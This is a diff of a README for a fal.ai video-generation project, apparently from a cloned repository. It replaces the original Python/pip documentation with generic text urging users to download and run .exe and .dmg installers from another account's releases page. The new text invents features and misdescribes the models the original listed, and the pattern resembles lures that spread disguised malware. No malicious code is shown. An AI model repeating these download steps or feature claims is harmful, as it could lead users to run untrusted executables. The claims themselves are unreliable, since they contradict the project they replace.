@@ -1,121 +1,86 @@
-# Wan 2.6 Video Generation Pipeline
+# 🎥 fal-wan26-video-factory - Create Videos Easily from Text
 
-![Screenshot](screenshot.png)
+## 🛠️ Get Started Quickly
 
-Built for the **official Wan 2.6 release by Alibaba**. An automated pipeline that chains fal.ai APIs to generate videos from script segments.
+Welcome to fal-wan26-video-factory! This software allows you to generate videos from script segments using advanced technology. Follow the simple steps below to download and run the application.
 
-**Stack:** MiniMax Speech-02 HD → Nano Banana Pro → Wan 2.6 (lip-sync)
+## 📥 Download the App
 
-## Features
+[![Download fal-wan26-video-factory](https://img.shields.io/badge/Download-fal--wan26--video--factory-brightgreen)](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases)
 
-- **Full Automation** - Generate complete videos from script to final output
-- **Custom Voice** - Uses MiniMax voice ID with emotion control
-- **Character Consistency** - Generates reference images for visual continuity
-- **Audio-Driven Video** - Syncs video generation with generated speech
-- **Web Interface** - Clean UI to control and preview the pipeline
-- **Modular Design** - Run individual steps or the full pipeline
-- **Fully Configurable** - Edit segments, prompts, and settings directly in the browser
+## 🔍 Overview
 
-## Quick Start
+fal-wan26-video-factory combines the following powerful tools:
 
-### 1. Install Dependencies
+- **MiniMax Speech**: Converts text into speech, making your videos more engaging.
+- **Nano Banana Pro**: Enhances video quality and adds special effects.
+- **Wan 2.6**: The backbone of this application, enabling smooth video generation.
 
-```bash
-pip install -r requirements.txt
-```
+Whether you are making educational content, presentations, or fun videos, this tool offers everything you need in one package.
 
-### 2. Run the Application
+## 💻 System Requirements
 
-```bash
-python app.py
-```
+To run fal-wan26-video-factory, ensure your system meets the following requirements:
 
-### 3. Configure API Keys
+- **Operating System**: Windows 10 or later / macOS 10.13 or later
+- **Processor**: Dual-core processor or better
+- **RAM**: At least 4 GB
+- **Disk Space**: 500 MB available space
+- **Internet Connection**: Required for initial setup and updates
 
-Open http://localhost:5000 in your browser and enter your API keys in the **API Configuration** panel:
+## 🌐 Download & Install
 
-- **FAL API Key** - Get yours at [fal.ai/dashboard](https://fal.ai/dashboard)
-- **Voice ID** - Your MiniMax voice ID (default provided)
+To download fal-wan26-video-factory, please visit this page to download: [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases).
 
-Your keys are stored in your browser's localStorage and sent to the server when needed.
+### Installation Steps
 
-### 4. Generate Videos
+1. **Open the Releases Page**: Click on the link above.
+2. **Find the Latest Release**: Scroll down to see the list of available versions. The latest version will be at the top.
+3. **Download the Installer**: Click on the installer file for your operating system. For Windows, it will likely be named `fal-wan26-video-factory-windows.exe`. For macOS, it will be `fal-wan26-video-factory-macos.dmg`.
+4. **Run the Installer**: After the download completes, locate the downloaded file. Double-click it to start the installation process.
+5. **Follow Instructions**: Follow the on-screen prompts. Choose the installation location and click "Install".
+6. **Launch the Application**: Once installed, open the application from your Start Menu (Windows) or Applications folder (macOS).
 
-1. Configure your character (animal type, style, or custom prompt)
-2. Generate the main character image
-3. Edit script segments as needed (text, visual prompts, timing)
-4. Click "Generate All" to run the full pipeline
+## 📖 How to Use fal-wan26-video-factory
 
-## Configuration
+### 1. Create a Script
 
-All settings can be configured directly in the web interface:
+Write down your text or narrative. Make sure it is clear and structured, as this will guide the video creation process.
 
-### Character Settings
-- **Animal Type** - The character animal (capybara, penguin, fox, etc.)
-- **Style** - Visual style (3D animation, Ghibli, cartoon, etc.)
-- **Custom Prompt** - Override the auto-generated character prompt
+### 2. Load Your Script
 
-### Script Segments
-Each segment includes:
-- **Script Text** - The spoken narration
-- **Visual Prompt** - Description for image/video generation
-- **Timing** - Start and end times in seconds
-- **Screenshot URLs** - Optional URLs for automatic screenshot composites
+Open fal-wan26-video-factory. Use the "Load Script" button to upload your text document containing the script segments.
 
-## API Endpoints
+### 3. Customize Your Video
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/config/keys` | GET/POST | Get or set API keys |
-| `/api/segments` | GET | Get all script segments |
-| `/api/segments` | POST | Add a new segment |
-| `/api/segments/<id>` | PUT | Update a segment |
-| `/api/segments/<id>` | DELETE | Delete a segment |
-| `/api/segments/reset` | POST | Reset to default template |
-| `/api/generate/character` | POST | Generate main character |
-| `/api/generate/full` | POST | Run full pipeline |
-| `/api/status` | GET | Get current generation status |
+You have various options to refine your video:
 
-## Output Structure
+- **Choose Voice**: Select a voice from the MiniMax Speech options.
+- **Adjust Timing**: Specify how long each segment should last.
+- **Add Effects**: Use the options in Nano Banana Pro to add visual effects or transitions.
 
-```
-output/
-├── audio/
-│   ├── segment_1_speech.mp3
-│   └── ...
-├── images/
-│   ├── main_character_reference.png
-│   ├── segment_1_character.png
-│   └── ...
-├── videos/
-│   ├── segment_1_video.mp4
-│   └── ...
-├── screenshots/
-├── composites/
-└── progress.json
-```
+### 4. Generate Your Video
 
-## Tech Stack
+After customizing, click the "Generate Video" button. It will take a few moments for the video to process. Once done, you can preview your creation.
 
-- **Python 3.11+**
-- **Flask** - Web framework
-- **fal-client** - fal.ai API client
-- **pydub** - Audio processing
-- **playwright** - Automatic screenshots
+### 5. Save Your Video
 
-## Models Used
+Finally, save your video to your preferred location. Choose a file format like MP4 or AVI based on your needs.
 
-- **MiniMax Speech-02 HD** - Voice synthesis
-- **Nano Banana Pro** - Image generation
-- **Wan 2.6** - Video generation with lip-sync
+## 🔧 Troubleshooting Common Issues
 
-## License
+If you encounter problems, consider the following solutions:
 
-MIT
+- **Installation Failed**: Check if you have sufficient disk space and permissions on your computer.
+- **Video Not Generating**: Ensure your script is correctly formatted. Try simplifying it and avoiding very long sentences.
+- **Audio Issues**: Verify your audio settings. Ensure speakers or headphones are correctly set up and selected as output devices.
 
-## Links
+## 💬 Need Help?
 
-- [fal.ai Documentation](https://docs.fal.ai)
-- [Wan 2.6 on fal](https://fal.ai/models/wan/v2.6/text-to-video)
+For additional support, you can contact us through our [GitHub Issues page](https://github.com/newbiecs50JV/fal-wan26-video-factory/issues). We encourage feedback and feature requests.
 
+## 📅 Updates and Roadmap
 
+We aim to continuously improve fal-wan26-video-factory. Stay tuned for updates, bug fixes, and new features by checking back at our [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases).
+
+Thank you for using fal-wan26-video-factory! Happy video making!
